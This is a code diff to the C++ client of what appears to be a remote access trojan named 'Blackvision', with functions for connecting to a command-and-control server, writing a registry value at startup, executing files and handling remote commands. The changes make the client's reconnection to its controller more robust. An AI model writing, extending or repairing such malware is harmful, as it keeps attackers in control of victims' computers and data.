@@ -1,12 +1,12 @@
-//#include "pch.h"
+//include "pch.h"
 #include "blackvision.h"
-//#pragma warning (disable : 4996) 
+//pragma warning (disable : 4996) 
 
 void Blackvision::reconnect()
 {
 	closesocket(sockfd);
 	WSACleanup();
-	Sleep(1000); // Reconnect 1 second interval
+	Sleep(INTERVAL); 
 	C2Connect();
 }
 void Blackvision::startup()
@@ -33,7 +33,6 @@ void Blackvision::startup()
 	RegCloseKey(NewVal);
 
 }
-
 
 
 void Blackvision::ExecuteFile(char* filename)
@@ -165,6 +164,10 @@ void Blackvision::ConnectionManage()
 	{
 		memset(recvbuf, '\0', BUFFER);
 		int resc = recv(sockfd, recvbuf, BUFFER, 0);
+		if (resc == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
+		{
+			connected = false;
+		}
 		std::string command(recvbuf);
 		if (command == "test\n")
 		{
@@ -264,9 +267,14 @@ void Blackvision::ConnectionManage()
 
 void Blackvision::respond(const char * data) {
 	int totalsent = 0;
+	int lerror = WSAGetLastError();
 	int buflen = strlen(data);
 	while (buflen > totalsent) {
 		int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
+		if (lerror == ECONNRESET)
+		{
+			connected = false;
+		}
 		if (r < 0) return;
 		totalsent += r;
 	}
